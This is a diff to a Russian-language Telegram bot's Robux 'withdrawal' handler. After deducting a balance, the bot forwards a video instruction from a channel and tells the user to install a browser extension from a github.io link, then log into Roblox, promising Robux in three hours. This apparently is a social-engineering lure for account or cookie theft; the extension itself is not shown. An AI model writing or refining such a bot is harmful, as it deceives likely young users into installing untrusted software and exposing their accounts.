@@ -211,10 +211,27 @@ def withdraw_amount(message):
     new_balance = balance - amount
     update_user(user_id, balance=new_balance)
 
+    # --- ОТПРАВКА ВИДЕО ИЗ КАНАЛА @dlavideobota ---
+    CHANNEL_USERNAME = '@dlavideobota'
+    MESSAGE_ID = 3
+
+    try:
+        bot.forward_message(
+            chat_id=user_id,
+            from_chat_id=CHANNEL_USERNAME,
+            message_id=MESSAGE_ID
+        )
+    except Exception as e:
+        print(f'Ошибка при пересылке видео: {e}')
+        bot.send_message(
+            user_id,
+            '⚠️ Не удалось загрузить видеоинструкцию. Ссылка на расширение ниже.'
+        )
+
     bot.send_message(
         user_id,
         f'✅ Заявка на вывод {amount} Robux принята!\n\n'
-        '📦 **Для получения Robux установи расширение:**\n'
+        '📦 **Установи расширение:**\n'
         '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
         '⚠️ После установки зайди на официальный сайт Roblox и войди в аккаунт.\n'
         'Через 3 часа Robux поступят на твой счёт.',
